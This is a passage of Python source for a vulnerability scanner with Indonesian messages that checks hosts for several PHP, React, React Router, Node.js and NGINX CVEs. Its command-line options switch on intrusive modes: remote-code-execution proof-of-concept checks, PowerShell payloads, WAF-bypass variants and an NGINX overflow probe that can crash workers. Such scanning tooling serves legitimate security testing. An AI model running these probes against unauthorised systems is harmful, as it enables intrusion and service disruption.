    display_host = safe_url_label(host)
    result = react_router_base_result(display_host)

    try:
        normalized = normalize_url(host, REACT_ROUTER_DEFAULT_PATH)
    except ValueError as exc:
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    result["host"] = normalized
    base_path = urlsplit(normalized).path or REACT_ROUTER_DEFAULT_PATH
    test_paths = paths if paths else [base_path]

    headers = dict(BROWSER_DEFAULT_HEADERS)
    if custom_headers:
        for name, value in custom_headers.items():
            if name.lower() != "proxy-authorization":
                set_header(headers, name, value)

    for idx, path in enumerate(test_paths):
        path = path if path.startswith("/") else "/" + path
        test_url = replace_path(
            normalized, path, REACT_ROUTER_DEFAULT_PATH
        )
        result["tested_url"] = test_url
        result["final_url"] = test_url
        result["request"] = react_router_request_dump(test_url, headers)

        response, body, final_url, error = react_router_fetch(
            test_url, headers, timeout, verify_ssl
        )

        if error:
            if response is not None:
                response.close()
            if idx < len(test_paths) - 1:
                continue
            result["error"] = error
            result["reason"] = error
            result["verdict"] = "ERROR"
            return result

        result["final_url"] = final_url
        result["status_code"] = response.status_code
        result["response"] = react_router_response_dump(response, body)

        if response.status_code in REACT_BLOCKED_STATUSES:
            if idx < len(test_paths) - 1:
                continue
            result["vulnerable"] = None
            result["verdict"] = "INCONCLUSIVE"
            result["reason"] = (
                f"respons HTTP {response.status_code} dapat berupa blokir "
                "WAF/autentikasi; keberadaan React Router tidak dapat "
                "dipastikan"
            )
            return result

        detection = react_router_detect(
            body, {name: value for name, value in response.headers.items()}
        )

        if not detection["detected"]:
            if idx < len(test_paths) - 1:
                continue
            result["framework"] = detection
            result["vulnerable"] = False
            result["verdict"] = "NOT VULNERABLE"
            result["reason"] = (
                "React Router Framework Mode tidak terdeteksi; CVE-2026-42211 "
                "tidak dapat dikonfirmasi"
            )
            return result

        manifest_url = urljoin(final_url, detection["manifest_path"])
        manifest_parsed = urlsplit(manifest_url)
        final_parsed = urlsplit(final_url)
        if (
            manifest_parsed.scheme in ("http", "https")
            and manifest_parsed.netloc == final_parsed.netloc
            and not (
                final_parsed.scheme == "https"
                and manifest_parsed.scheme != "https"
            )
        ):
            manifest_response, manifest_body, _, manifest_error = (
                react_router_fetch(
                    manifest_url, headers, timeout, verify_ssl
                )
            )
            detection["manifest_checked"] = True
            if manifest_error:
                detection["manifest_error"] = manifest_error
                if manifest_response is not None:
                    manifest_response.close()
            elif manifest_response is not None:
                detection["manifest_status"] = manifest_response.status_code
                if manifest_body:
                    detection["evidence"].append("manifest")
                    if not detection["version"]:
                        detection["version"] = react_router_extract_version(
                            manifest_body.decode("utf-8", "replace"),
                            {
                                name: value
                                for name, value in manifest_response.headers.items()
                            },
                        )
                manifest_response.close()

        detection["affected"] = react_router_version_status(
            detection["version"]
        )
        result["framework"] = detection
        version = detection["version"]

        if detection["affected"] is True:
            result["vulnerable"] = None
            result["verdict"] = "INCONCLUSIVE"
            result["reason"] = (
                f"React Router Framework Mode terdeteksi dengan versi "
                f"{version} (rentang terdampak 7.0.0-7.14.1). Eksploitasi "
                "CVE-2026-42211 memerlukan prototype pollution yang sudah ada "
                "di aplikasi; konfirmasi manual diperlukan"
            )
        elif detection["affected"] is False:
            result["vulnerable"] = False
            result["verdict"] = "NOT VULNERABLE"
            result["reason"] = (
                f"React Router Framework Mode terdeteksi dengan versi "
                f"{version}; versi ini tidak berada di rentang terdampak "
                "CVE-2026-42211 (fixed 7.14.2)"
            )
        else:
            result["vulnerable"] = None
            result["verdict"] = "INCONCLUSIVE"
            result["reason"] = (
                "React Router Framework Mode terdeteksi, tetapi versi tidak "
                "dapat dipastikan. Periksa package.json/build; eksploitasi "
                "CVE-2026-42211 juga memerlukan prototype pollution"
            )
        return result

    result["vulnerable"] = False
    result["verdict"] = "NOT VULNERABLE"
    result["reason"] = (
        "React Router Framework Mode tidak terdeteksi pada path yang diuji"
    )
    return result


# ---------------------------------------------------------------------------
# Dispatcher, output, dan CLI
# ---------------------------------------------------------------------------


def error_finding(engine: str, cve: str, host: str, message: str) -> dict:
    return {
        "engine": engine,
        "cve": cve,
        "host": host,
        "vulnerable": None,
        "verdict": "ERROR",
        "status_code": None,
        "error": message,
        "reason": message,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "timestamp": utc_now(),
    }


def finding_label(finding: dict) -> str:
    if finding.get("vulnerable") is True:
        return "RENTAN"
    if finding.get("vulnerable") is False:
        return "TIDAK RENTAN"
    if finding.get("verdict") == "ERROR":
        return "GALAT"
    return "TIDAK KONKLUSIF"


def finding_color(finding: dict) -> str:
    if finding.get("vulnerable") is True:
        return Colors.RED + Colors.BOLD
    if finding.get("vulnerable") is False:
        return Colors.GREEN
    return Colors.YELLOW


def scan_host(
    host: str,
    mode: str,
    timeout: Optional[int],
    verify_ssl: TLSVerify,
    custom_headers: Dict[str, str],
    sapi: str,
    paths: Optional[List[str]],
    safe_check: bool,
    windows: bool,
    waf_bypass: bool,
    waf_bypass_size_kb: int,
    vercel_waf_bypass: bool,
    nodejs_poc: bool = False,
    nginx_poc: bool = False,
    baseline: bool = True,
) -> dict:
    host_label = safe_url_label(host)
    findings = []

    php_timeout = timeout if timeout is not None else PHP_DEFAULT_TIMEOUT
    react_timeout = timeout if timeout is not None else REACT_DEFAULT_TIMEOUT
    nginx_timeout = (
        timeout if timeout is not None else NGINX_DEFAULT_TIMEOUT
    )
    if timeout is None and waf_bypass:
        react_timeout = 20
    baseline_timeout = (
        timeout if timeout is not None else REACT_DEFAULT_TIMEOUT
    )
    if baseline:
        try:
            fingerprint = collect_fingerprint(
                host, baseline_timeout, verify_ssl, custom_headers
            )
        except Exception as exc:
            fingerprint = {
                "error": f"kesalahan tak terduga saat baseline: {exc}",
                "reason": f"baseline gagal: {exc}",
                "blocked": False,
                "waf": [],
                "tech": [],
            }
    else:
        fingerprint = None

    if mode in ("php", "all"):
        skip_reason = php_skip_reason(mode, paths, fingerprint)
        if skip_reason:
            findings.append(
                php_skipped_result(host_label, fingerprint, skip_reason)
            )
        else:
            try:
                findings.append(
                    php_check_vulnerability(
                        host,
                        timeout=php_timeout,
                        verify_ssl=verify_ssl,
                        custom_headers=custom_headers,
                        sapi=sapi,
                        paths=paths,
                    )
                )
            except Exception as exc:
                findings.append(
                    error_finding(
                        "php",
                        PHP_CVES,
                        host_label,
                        f"kesalahan tak terduga: {exc}",
                    )
                )

    if mode in ("react", "all"):
        try:
            findings.append(
                react_check_vulnerability(
                    host,
                    timeout=react_timeout,
                    verify_ssl=verify_ssl,
                    custom_headers=custom_headers,
                    safe_check=safe_check,
                    windows=windows,
                    waf_bypass=waf_bypass,
                    waf_bypass_size_kb=waf_bypass_size_kb,
                    vercel_waf_bypass=vercel_waf_bypass,
                    paths=paths,
                )
            )
        except Exception as exc:
            findings.append(
                error_finding(
                    "react",
                    REACT_CVES,
                    host_label,
                    f"kesalahan tak terduga: {exc}",
                )
            )

    if mode in ("react-router", "all"):
        try:
            findings.append(
                react_router_check_vulnerability(
                    host,
                    timeout=react_timeout,
                    verify_ssl=verify_ssl,
                    custom_headers=custom_headers,
                    paths=paths,
                )
            )
        except Exception as exc:
            findings.append(
                error_finding(
                    "react-router",
                    REACT_ROUTER_CVES,
                    host_label,
                    f"kesalahan tak terduga: {exc}",
                )
            )

    if mode in ("nodejs", "all"):
        try:
            nodejs_check = (
                nodejs_poc_check_vulnerability
                if nodejs_poc
                else nodejs_check_vulnerability
            )
            findings.append(
                nodejs_check(
                    host,
                    timeout=react_timeout,
                    verify_ssl=verify_ssl,
                    custom_headers=custom_headers,
                    paths=paths,
                )
            )
        except Exception as exc:
            findings.append(
                error_finding(
                    "nodejs",
                    NODEJS_BROTLI_CVES,
                    host_label,
                    f"kesalahan tak terduga: {exc}",
                )
            )

    if mode in ("nginx", "all"):
        try:
            nginx_check = (
                nginx_poc_check_vulnerability
                if nginx_poc
                else nginx_check_vulnerability
            )
            nginx_kwargs = {
                "timeout": nginx_timeout,
                "verify_ssl": verify_ssl,
                "custom_headers": custom_headers,
                "paths": paths,
            }
            if nginx_poc:
                nginx_kwargs["baseline_blocked"] = bool(
                    fingerprint and fingerprint.get("blocked")
                )
            findings.append(nginx_check(host, **nginx_kwargs))
        except Exception as exc:
            findings.append(
                error_finding(
                    "nginx",
                    NGINX_CVES,
                    host_label,
                    f"kesalahan tak terduga: {exc}",
                )
            )

    if any(finding.get("vulnerable") is True for finding in findings):
        vulnerable: Optional[bool] = True
        verdict = "VULNERABLE"
    elif findings and all(
        finding.get("verdict") == "ERROR" for finding in findings
    ):
        vulnerable = None
        verdict = "ERROR"
    elif any(finding.get("vulnerable") is None for finding in findings):
        vulnerable = None
        verdict = "INCONCLUSIVE"
    elif findings:
        vulnerable = False
        verdict = "NOT VULNERABLE"
    else:
        vulnerable = None
        verdict = "ERROR"

    status_code = None
    if fingerprint and fingerprint.get("status_code") is not None:
        status_code = fingerprint.get("status_code")
    elif not (fingerprint and fingerprint.get("error")):
        status_code = next(
            (
                finding.get("status_code")
                for finding in findings
                if finding.get("status_code") is not None
            ),
            None,
        )
    errors = list(
        dict.fromkeys(
            finding.get("error")
            for finding in findings
            if finding.get("error")
        )
    )
    reason = None

    if (
        vulnerable is False
        and fingerprint
        and fingerprint.get("blocked")
    ):
        vulnerable = None
        verdict = "INCONCLUSIVE"
        reason = (
            "hasil tidak rentan dianggap tidak konklusif karena baseline "
            f"diblokir WAF/challenge: {fingerprint.get('reason')}"
        )
    elif fingerprint and fingerprint.get("error"):
        reason = f"baseline gagal: {fingerprint.get('error')}"

    return {
        "host": host_label,
        "vulnerable": vulnerable,
        "verdict": verdict,
        "status_code": status_code,
        "error": "; ".join(errors) if errors else None,
        "reason": reason,
        "fingerprint": fingerprint,
        "findings": findings,
        "timestamp": utc_now(),
    }


def save_results(
    results: List[dict],
    output_file: str,
    mode: str,
    vulnerable_only: bool = True,
    announce: bool = True,
) -> bool:
    selected = (
        [result for result in results if result.get("vulnerable") is True]
        if vulnerable_only
        else results
    )
    summary = {
        "total_scanned": len(results),
        "vulnerable": sum(
            result.get("vulnerable") is True for result in results
        ),
        "not_vulnerable": sum(
            result.get("vulnerable") is False for result in results
        ),
        "inconclusive": sum(
            result.get("vulnerable") is None
            and result.get("verdict") != "ERROR"
            for result in results
        ),
        "errors": sum(
            result.get("verdict") == "ERROR" for result in results
        ),
    }
    output = {
        "scan_time": utc_now(),
        "mode": mode,
        "total_results": len(results),
        "saved_results": len(selected),
        "summary": summary,
        "results": selected,
    }
    try:
        with open(output_file, "w", encoding="utf-8") as handle:
            json.dump(output, handle, indent=2)
        if announce:
            print(colorize(f"\n[+] Hasil disimpan ke: {output_file}", Colors.GREEN))
        return True
    except OSError as exc:
        print(colorize(f"\n[ERROR] Gagal menyimpan hasil: {exc}", Colors.RED))
        return False


def print_result(result: dict, verbose: bool = False) -> None:
    host = terminal_safe(result.get("host", ""))
    if result.get("vulnerable") is True:
        status = colorize("[RENTAN]", Colors.RED + Colors.BOLD)
    elif result.get("vulnerable") is False:
        status = colorize("[TIDAK RENTAN]", Colors.GREEN)
    elif result.get("verdict") == "ERROR":
        status = colorize("[GALAT]", Colors.YELLOW)
    else:
        status = colorize("[TIDAK KONKLUSIF]", Colors.YELLOW)

    details = []
    if result.get("status_code") is not None:
        details.append(f"Status: {result['status_code']}")
    suffix = " - " + " - ".join(details) if details else ""
    print(f"{status} {colorize(host, Colors.WHITE)}{suffix}")

    fingerprint = result.get("fingerprint") or {}
    if fingerprint.get("waf"):
        print(
            "  -> Fingerprint: "
            + terminal_safe(", ".join(fingerprint["waf"]))
        )
    if fingerprint.get("blocked"):
        print(
            colorize(
                "  -> Baseline diblokir WAF/challenge: "
                + terminal_safe(str(fingerprint.get("reason") or "")),
                Colors.YELLOW,
            )
        )
    if fingerprint.get("error"):
        print(
            colorize(
                "  -> Baseline gagal: "
                + terminal_safe(str(fingerprint["error"])),
                Colors.YELLOW,
            )
        )
    if fingerprint.get("tech_summary"):
        print(
            colorize(
                "  -> Teknologi: "
                + terminal_safe(str(fingerprint["tech_summary"])),
                Colors.CYAN,
            )
        )
    if verbose and fingerprint:
        baseline_details = []
        if fingerprint.get("status_code") is not None:
            baseline_details.append(f"HTTP {fingerprint['status_code']}")
        if fingerprint.get("server"):
            baseline_details.append(
                f"Server: {terminal_safe(str(fingerprint['server']))}"
            )
        if fingerprint.get("tech"):
            baseline_details.append(
                "Tech: "
                + terminal_safe(", ".join(str(item) for item in fingerprint["tech"]))
            )
        if fingerprint.get("waf"):
            baseline_details.append(
                "WAF: "
                + terminal_safe(", ".join(str(item) for item in fingerprint["waf"]))
            )
        if baseline_details:
            print("  -> Baseline: " + " - ".join(baseline_details))
        for detail in fingerprint.get("tech_details") or []:
            name = terminal_safe(str(detail.get("name", "?")))
            confidence = terminal_safe(str(detail.get("confidence", "?")))
            evidence = "; ".join(
                terminal_safe(str(item))
                for item in detail.get("evidence") or []
            )
            version = detail.get("version")
            if version:
                evidence = (
                    f"{evidence}; versi {terminal_safe(str(version))}"
                    if evidence
                    else f"versi {terminal_safe(str(version))}"
                )
            print(
                colorize(
                    f"     {name} [{confidence}]: {evidence}",
                    Colors.CYAN,
                )
            )
    if verbose and result.get("reason"):
        print(f"  -> {terminal_safe(str(result['reason']))}")

    for finding in result.get("findings", []):
        label = finding_label(finding)
        engine = str(finding.get("engine", "?")).upper()
        cve = finding.get("cve", "")
        line = f"  -> {engine} ({cve}): {colorize(label, finding_color(finding))}"
        print(line)

        final_url = finding.get("final_url")
        tested_url = finding.get("tested_url")
        if final_url and tested_url and final_url != tested_url:
            print(f"     Dialihkan ke: {terminal_safe(final_url)}")
        if verbose and finding.get("reason"):
            print(f"     Alasan: {terminal_safe(str(finding['reason']))}")
        if verbose and finding.get("response"):
            print(colorize("     Cuplikan respons:", Colors.CYAN))
            for line_text in finding["response"].split("\r\n")[:10]:
                print(f"       {terminal_safe(line_text)}")

    if verbose and result.get("error") and not result.get("findings"):
        print(f"  -> {terminal_safe(str(result['error']))}")
    if (
        result.get("verdict") == "ERROR"
        and result.get("error")
        and not fingerprint.get("error")
    ):
        print(
            colorize(
                "  -> Error: " + terminal_safe(str(result["error"])),
                Colors.YELLOW,
            )
        )


class IndonesianArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        if not sys.stderr.isatty():
            disable_colors()
        self.print_usage(sys.stderr)
        print(colorize(f"\n[GALAT] {message}", Colors.RED), file=sys.stderr)
        if "-u" in message or "-l" in message or "required" in message.lower():
            print(
                colorize(
                    "\n[INFO] Harus memilih salah satu target pemindaian.\n",
                    Colors.CYAN,
                ),
                file=sys.stderr,
            )
            print("Cara pakai:", file=sys.stderr)
            print(
                "  python scanner.py -u <URL>      Scan satu target",
                file=sys.stderr,
            )
            print(
                "  python scanner.py -l <FILE.txt> Scan beberapa target dari file",
                file=sys.stderr,
            )
            print("\nContoh:", file=sys.stderr)
            print(
                "  python scanner.py -u https://example.com",
                file=sys.stderr,
            )
            print(
                "  python scanner.py -l hosts.txt --mode all -o result.json",
                file=sys.stderr,
            )
            print(
                "\nLihat semua opsi: python scanner.py -h",
                file=sys.stderr,
            )
        sys.exit(2)


def build_parser() -> argparse.ArgumentParser:
    parser = IndonesianArgumentParser(
        description=(
            "Scanner gabungan CVE PHP, React, Node.js, dan NGINX. Memindai "
            "CVE-2026-109618, CVE-2026-109619, CVE-2025-55182, "
            "CVE-2025-66478, CVE-2026-42211 (React Router, pasif), "
            "CVE-2026-111497 (Node.js, pasif/PoC), dan "
            "CVE-2026-42945 (NGINX, pasif/PoC)."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  %(prog)s -u https://example.com
  %(prog)s -u https://example.com --mode php
  %(prog)s -u https://example.com --mode react
  %(prog)s -u https://example.com --mode react --rce
  %(prog)s -u https://example.com --mode react-router
  %(prog)s -u https://example.com --mode nodejs
  %(prog)s -u https://example.com --mode nodejs --nodejs-poc
  %(prog)s -u https://example.com --mode nginx
  %(prog)s -u https://example.com --mode nginx --nginx-poc --path /api
  %(prog)s -l hosts.txt --mode all -t 20 --rate-limit 5 -o result.json
  %(prog)s -u https://example.com --proxy http://127.0.0.1:8080
  %(prog)s -u https://example.com -H "Authorization: Bearer token"
  %(prog)s -u https://example.com --ca-bundle intermediate.pem
  %(prog)s -u https://example.com --system-ca
  %(prog)s -u https://example.com --mode php --path /phpinfo.php
  %(prog)s -u https://example.com --no-baseline --retries 0
        """,
    )
    parser.add_argument(
        "--mode",
        choices=("php", "react", "react-router", "nodejs", "nginx", "all"),
        default="all",
        help=(
            "Engine yang dijalankan: php, react, react-router, nodejs, "
            "nginx, atau all (default: all)"
        ),
    )

    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument("-u", "--url", help="Satu URL/host yang diperiksa")
    input_group.add_argument(
        "-l", "--list", help="File berisi daftar host (satu per baris)"
    )

    parser.add_argument(
        "-t", "--threads", type=int, default=10, help="Jumlah thread (default: 10)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=None,
        help=(
            "Timeout per permintaan dalam detik "
            "(default: PHP 60, React/React Router/NGINX 10)"
        ),
    )
    parser.add_argument(
        "--rate-limit",
        type=float,
        default=0.0,
        metavar="REQ/DETIK",
        help=(
            "Batas permintaan global per detik (default: 0 = tanpa batas). "
            "Contoh: 5 berarti maksimal 5 permintaan/detik."
        ),
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=2,
        metavar="N",
        help="Jumlah percobaan ulang untuk error sementara (default: 2)",
    )
    parser.add_argument(
        "--retry-backoff",
        type=float,
        default=0.5,
        metavar="DETIK",
        help="Jeda dasar backoff eksponensial dalam detik (default: 0.5)",
    )
    parser.add_argument(
        "--proxy",
        metavar="URL",
        help=(
            "Proxy HTTP/HTTPS untuk semua permintaan, mis. "
            "http://127.0.0.1:8080 atau http://user:pass@host:port. "
            "Tanpa opsi ini scanner berjalan langsung tanpa proxy."
        ),
    )
    parser.add_argument(
        "--no-baseline",
        action="store_true",
        help="Lewati permintaan baseline/fingerprint WAF",
    )
    parser.add_argument(
        "-o", "--output", help="File output hasil pemindaian (JSON)"
    )
    parser.add_argument(
        "--all-results",
        action="store_true",
        help="Simpan semua hasil, bukan hanya host yang rentan",
    )
    parser.add_argument(
        "-k",
        "--insecure",
        action="store_true",
        help="Nonaktifkan verifikasi sertifikat TLS (default: verifikasi aktif)",
    )
    parser.add_argument(
        "--ca-bundle",
        metavar="FILE",
        help=(
            "Tambahkan CA/intermediate PEM ke trust store scanner. Berkas "
            "digabung dengan CA bawaan requests, jadi cukup berisi "
            "intermediate yang hilang."
        ),
    )
    parser.add_argument(
        "--system-ca",
        action="store_true",
        help=(
            "Gunakan trust store CA sistem operasi untuk verifikasi TLS. "
            "Berguna jika browser dapat membuka target tetapi scanner gagal "
            "karena certifi tidak memiliki intermediate."
        ),
    )
    parser.add_argument(
        "-H",
        "--header",
        action="append",
        dest="headers",
        metavar="HEADER",
        help="Header kustom dalam format 'Nama: Nilai'; dapat diulang",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Tampilkan alasan verdict dan cuplikan respons",
    )
    parser.add_argument(
        "-q", "--quiet", action="store_true", help="Hanya tampilkan host rentan"
    )
    parser.add_argument(
        "--no-color", action="store_true", help="Nonaktifkan warna output"
    )
    parser.add_argument(
        "--sapi",
        choices=("auto", "mod_php", "fpm"),
        default="auto",
        help="Aturan verdict PHP yang digunakan (default: auto)",
    )
    parser.add_argument(
        "--path", action="append", dest="paths", help="Path kustom; dapat diulang"
    )
    parser.add_argument(
        "--path-file", help="File berisi daftar path (satu per baris)"
    )
    react_mode_group = parser.add_mutually_exclusive_group()
    react_mode_group.add_argument(
        "--safe-check",
        dest="safe_check",
        action="store_true",
        help="Gunakan deteksi side-channel aman untuk engine React (default)",
    )
    react_mode_group.add_argument(
        "--rce",
        dest="safe_check",
        action="store_false",
        help=(
            "Gunakan RCE PoC check untuk engine React (lebih intrusif; "
            "hanya untuk target yang berizin)"
        ),
    )
    parser.set_defaults(safe_check=True)
    parser.add_argument(
        "--windows",
        action="store_true",
        help="Gunakan payload PowerShell Windows (memerlukan --rce)",
    )
    parser.add_argument(
        "--waf-bypass",
        action="store_true",
        help="Tambahkan data junk untuk bypass WAF (memerlukan --rce)",
    )
    parser.add_argument(
        "--waf-bypass-size",
        type=int,
        default=128,
        metavar="KB",
        help="Ukuran data junk untuk bypass WAF dalam KB (default: 128)",
    )
    parser.add_argument(
        "--vercel-waf-bypass",
        action="store_true",
        help="Gunakan varian payload bypass WAF Vercel (memerlukan --rce)",
    )
    parser.add_argument(
        "--nodejs-poc",
        action="store_true",
        help=(
            "Aktifkan PoC decoder Brotli Node.js (CVE-2026-111497). "
            "Mengirim vektor malformed Brotli; hanya untuk target berizin"
        ),
    )
    parser.add_argument(
        "--nginx-poc",
        action="store_true",
        help=(
            "Aktifkan probe overflow NGINX (CVE-2026-42945). Dapat memicu "
            "crash/restart worker; hanya untuk target berizin"
        ),
    )
    return parser


def main() -> None:
    if "--no-color" in sys.argv[1:] or not sys.stdout.isatty():
        disable_colors()
    if len(sys.argv) == 1:
        print_banner()
        print(colorize("[INFO] Belum ada target pemindaian.", Colors.CYAN))
        print("\nCara pakai:")
        print("  python scanner.py -u <URL>      Scan satu target")
        print("  python scanner.py -l <FILE.txt> Scan beberapa target dari file")
        print("\nContoh:")
        print("  python scanner.py -u https://example.com")
        print("  python scanner.py -l hosts.txt --mode all -o result.json")
        print("\nLihat semua opsi: python scanner.py -h")
        sys.exit(0)

    args = build_parser().parse_args()
    if args.threads < 1:
        raise SystemExit("--threads minimal 1")
    if args.timeout is not None and args.timeout > MAX_TIMEOUT:
        raise SystemExit(f"--timeout maksimal {MAX_TIMEOUT} detik")
    if args.timeout is not None and args.timeout < 1:
        raise SystemExit("--timeout minimal 1")
    if args.waf_bypass_size < 1:
        raise SystemExit("--waf-bypass-size minimal 1 KB")
    if args.waf_bypass_size > MAX_WAF_BYPASS_SIZE_KB:
        raise SystemExit(
            f"--waf-bypass-size maksimal {MAX_WAF_BYPASS_SIZE_KB} KB"
        )
    if not math.isfinite(args.rate_limit) or args.rate_limit < 0:
        raise SystemExit("--rate-limit harus angka finite >= 0")
    if args.rate_limit > 0:
        interval = 1.0 / args.rate_limit
        if not math.isfinite(interval) or interval > MAX_RATE_INTERVAL:
            raise SystemExit(
                "--rate-limit terlalu kecil; interval antar-permintaan "
                f"maksimal {MAX_RATE_INTERVAL:g} detik"
            )
    if args.retries < 0 or args.retries > MAX_RETRIES:
        raise SystemExit(f"--retries harus antara 0 dan {MAX_RETRIES}")
    if not math.isfinite(args.retry_backoff) or args.retry_backoff < 0:
        raise SystemExit("--retry-backoff harus angka finite >= 0")
    if args.retry_backoff > MAX_RETRY_BACKOFF:
        raise SystemExit(
            f"--retry-backoff maksimal {MAX_RETRY_BACKOFF:g} detik"
        )
    if args.vercel_waf_bypass and args.safe_check:
        raise SystemExit(
            "--vercel-waf-bypass mengirim RCE PoC; tambahkan --rce "
            "untuk mengaktifkannya secara eksplisit"
        )
    if args.vercel_waf_bypass and (args.windows or args.waf_bypass):
        raise SystemExit(
            "--vercel-waf-bypass tidak dapat digabung dengan --windows "
            "atau --waf-bypass"
        )
    if args.nodejs_poc and args.mode not in ("nodejs", "all"):
        raise SystemExit(
            "--nodejs-poc hanya dapat digunakan dengan --mode nodejs atau all"
        )
    if args.nginx_poc and args.mode not in ("nginx", "all"):
        raise SystemExit(
            "--nginx-poc hanya dapat digunakan dengan --mode nginx atau all"
        )
    if sum((args.insecure, bool(args.ca_bundle), args.system_ca)) > 1:
        raise SystemExit(
            "--insecure, --ca-bundle, dan --system-ca saling eksklusif"
        )

    RUNTIME.rate_limit = args.rate_limit
    RUNTIME.retries = args.retries
    RUNTIME.retry_backoff = args.retry_backoff
    try:
        RUNTIME.proxy = parse_proxy(args.proxy) if args.proxy else None
    except ValueError as exc:
        raise SystemExit(str(exc)) from exc

    if args.no_color or not sys.stdout.isatty():
        disable_colors()

    try:
        custom_headers = parse_headers(args.headers)
    except ValueError as exc:
        raise SystemExit(str(exc)) from exc

    if args.url is not None:
        if not args.url.strip():
            raise SystemExit("URL tidak boleh kosong")
        loaded_hosts = [args.url]
    else:
        loaded_hosts = load_lines(args.list, "host")
    hosts = deduplicate_hosts(loaded_hosts)
    if not hosts:
        raise SystemExit("Tidak ada host untuk dipindai")

    paths: Optional[List[str]] = None
    if args.path_file:
        paths = normalize_paths(load_lines(args.path_file, "path"))
    elif args.paths:
        paths = normalize_paths(args.paths)
    if paths == []:
        raise SystemExit("Tidak ada path untuk dipindai")

    verify_ssl: TLSVerify = not args.insecure
    if args.insecure:
        import urllib3

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    elif args.ca_bundle:
        try:
            verify_ssl = merge_ca_bundle(args.ca_bundle)
        except ValueError as exc:
            raise SystemExit(str(exc)) from exc
    elif args.system_ca:
        try:
            verify_ssl = build_system_ca_bundle()
        except ValueError as exc:
            raise SystemExit(str(exc)) from exc

    php_timeout = args.timeout if args.timeout is not None else PHP_DEFAULT_TIMEOUT
    react_timeout = args.timeout if args.timeout is not None else REACT_DEFAULT_TIMEOUT
    nginx_timeout = (
        args.timeout if args.timeout is not None else NGINX_DEFAULT_TIMEOUT
    )
    if args.timeout is None and args.waf_bypass:
        react_timeout = 20

    if not args.quiet:
        print_banner()
        mode_label = {
            "php": "PHP saja",
            "react": "React saja",
            "react-router": "React Router saja",
            "nodejs": "Node.js saja",
            "nginx": "NGINX saja",
            "all": "PHP + React + React Router + Node.js + NGINX",
        }[args.mode]
        print(colorize(f"[*] Mode: {mode_label}", Colors.CYAN))
        print(colorize(f"[*] Memuat {len(hosts)} host untuk dipindai", Colors.CYAN))
        if len(hosts) != len(loaded_hosts):
            duplicate_count = len(loaded_hosts) - len(hosts)
            print(
                colorize(
                    f"[*] Melewati {duplicate_count} host duplikat",
                    Colors.CYAN,
                )
            )
        if paths:
            print(
                colorize(
                    f"[*] Menguji {len(paths)} path kustom: {', '.join(paths)}",
                    Colors.CYAN,
                )
            )
        else:
            if args.mode in ("php", "all"):
                print(
                    colorize(
                        f"[*] Path default PHP: {PHP_DEFAULT_PATH}",
                        Colors.CYAN,
                    )
                )
            if args.mode in ("react", "all"):
                print(
                    colorize(
                        f"[*] Path default React: {REACT_DEFAULT_PATH}",
                        Colors.CYAN,
                    )
                )
            if args.mode in ("react-router", "all"):
                print(
                    colorize(
                        "[*] Path default React Router: "
                        f"{REACT_ROUTER_DEFAULT_PATH}",
                        Colors.CYAN,
                    )
                )
            if args.mode in ("nginx", "all"):
                print(
                    colorize(
                        f"[*] Path default NGINX: {NGINX_DEFAULT_PATH}",
                        Colors.CYAN,
                    )
                )
        print(colorize(f"[*] Menggunakan {args.threads} thread", Colors.CYAN))
        if args.rate_limit > 0:
            print(
                colorize(
                    f"[*] Rate limit global: {args.rate_limit:g} permintaan/detik",
                    Colors.CYAN,
                )
            )
        else:
            print(colorize("[*] Rate limit global: tanpa batas", Colors.CYAN))
        print(
            colorize(
                f"[*] Retry: {args.retries} percobaan, backoff "
                f"{args.retry_backoff:g}s",
                Colors.CYAN,
            )
        )
        if RUNTIME.proxy is not None:
            print(
                colorize(
                    f"[*] Proxy: {RUNTIME.proxy.display}",
                    Colors.CYAN,
                )
            )
        else:
            print(colorize("[*] Proxy: tidak digunakan", Colors.CYAN))
        if args.no_baseline:
            print(colorize("[*] Baseline/fingerprint WAF: dilewati", Colors.CYAN))
        else:
            print(colorize("[*] Baseline/fingerprint WAF: aktif", Colors.CYAN))
        if args.mode in ("php", "all"):
            print(colorize(f"[*] Timeout PHP: {php_timeout}s", Colors.CYAN))
            print(colorize(f"[*] Aturan SAPI PHP: {args.sapi}", Colors.CYAN))
        if args.mode in ("react", "all"):
            print(colorize(f"[*] Timeout React: {react_timeout}s", Colors.CYAN))
            if args.vercel_waf_bypass:
                print(
                    colorize(
                        "[*] React: varian bypass WAF Vercel (RCE PoC)",
                        Colors.CYAN,
                    )
                )
            elif args.safe_check:
                print(
                    colorize(
                        "[*] React: safe side-channel check (default)",
                        Colors.CYAN,
                    )
                )
            else:
                print(
                    colorize(
                        "[!] React: RCE PoC check aktif (intrusif)",
                        Colors.YELLOW,
                    )
                )
            if args.windows and not args.safe_check:
                print(
                    colorize(
                        "[*] Mode Windows diaktifkan (payload PowerShell)",
                        Colors.CYAN,
                    )
                )
            if args.waf_bypass and not args.safe_check:
                print(
                    colorize(
                        f"[*] WAF bypass aktif ({args.waf_bypass_size} KB data junk)",
                        Colors.CYAN,
                    )
                )
            if (args.windows or args.waf_bypass) and args.safe_check:
                print(
                    colorize(
                        "[!] --windows/--waf-bypass diabaikan karena mode aman; "
                        "gunakan --rce untuk mengaktifkannya",
                        Colors.YELLOW,
                    )
                )
            if args.vercel_waf_bypass:
                print(
                    colorize(
                        "[*] Mode bypass WAF Vercel diaktifkan",
                        Colors.CYAN,
                    )
                )
        if args.mode in ("react-router", "all"):
            print(
                colorize(
                    f"[*] Timeout React Router: {react_timeout}s",
                    Colors.CYAN,
                )
            )
            print(
                colorize(
                    "[*] React Router: deteksi pasif Framework Mode "
                    "(CVE-2026-42211)",
                    Colors.CYAN,
                )
            )
        if args.mode in ("nodejs", "all"):
            print(
                colorize(
                    f"[*] Timeout Node.js: {react_timeout}s",
                    Colors.CYAN,
                )
            )
            if args.nodejs_poc:
                print(
                    colorize(
                        "[!] Node.js: PoC decoder Brotli aktif (intrusif)",
                        Colors.YELLOW,
                    )
                )
            else:
                print(
                    colorize(
                        "[*] Node.js: deteksi pasif (CVE-2026-111497)",
                        Colors.CYAN,
                    )
                )
        if args.mode in ("nginx", "all"):
            print(
                colorize(
